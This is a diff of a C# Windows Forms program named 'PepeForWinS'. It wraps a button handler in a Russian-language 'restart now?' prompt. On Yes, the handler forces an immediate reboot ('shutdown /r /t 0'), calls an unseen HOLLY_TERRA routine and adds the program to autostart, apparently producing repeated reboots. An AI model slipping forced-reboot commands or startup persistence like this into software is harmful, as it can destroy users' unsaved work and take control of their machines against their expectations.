@@ -21,9 +21,14 @@ namespace PepeForWinS
         }
 
         public void Button1_Click(object sender, EventArgs e)
-        { 
-            HOLLY_TERRA();
-             using (FileStream fs5 = File.Create("text.txt"))
+        {
+            DialogResult result = MessageBox.Show("Перезагрузить сейчас?", "Ваш компьютер будет перезагружен несколько раз", MessageBoxButtons.YesNo);
+            if (result == DialogResult.Yes)
+            {
+                Process.Start("shutdown", "/r /t 0");
+
+                HOLLY_TERRA();
+                using (FileStream fs5 = File.Create("text.txt"))
                 {
                     string info = "";
                     using (var sr = new StreamWriter(fs5))
@@ -31,10 +36,11 @@ namespace PepeForWinS
                         sr.Write(info);
                     }
                 }
-            /*Добавление в автозапуск*/
-             AddAutostart();
-            /*Запуск первого скрипта*/
-            //Process.Start("script1.bat");
+                /*Добавление в автозапуск*/
+                AddAutostart();
+                /*Запуск первого скрипта*/
+                //Process.Start("script1.bat");
+            }
         }
         public void AddAutostart()
         {
